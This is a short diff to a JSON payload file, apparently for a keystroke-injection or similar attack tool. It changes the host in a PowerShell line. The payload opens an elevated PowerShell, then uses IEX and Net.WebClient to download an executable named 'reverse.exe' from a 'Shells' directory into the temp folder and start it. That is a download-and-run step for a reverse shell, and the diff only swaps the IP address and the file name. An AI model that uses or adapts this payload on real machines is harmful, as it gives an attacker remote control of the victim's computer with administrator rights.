@@ -11,6 +11,6 @@
 
   "payload": [
     "`06powershell start-process -verb runas powershell.exe",
-    "`05IEX (New-Object Net.WebClient).DownloadFile('http://192.168.43.249/Shells/reverse.exe',\"$env:temp\\s.exe\");Start-Process \"$env:temp\\s.exe\""
+    "`05IEX (New-Object Net.WebClient).DownloadFile('http://127.0.0.1/Shells/reverse.exe',\"$env:temp\\reverse.exe\");Start-Process \"$env:temp\\reverse.exe\""
   ]
 }
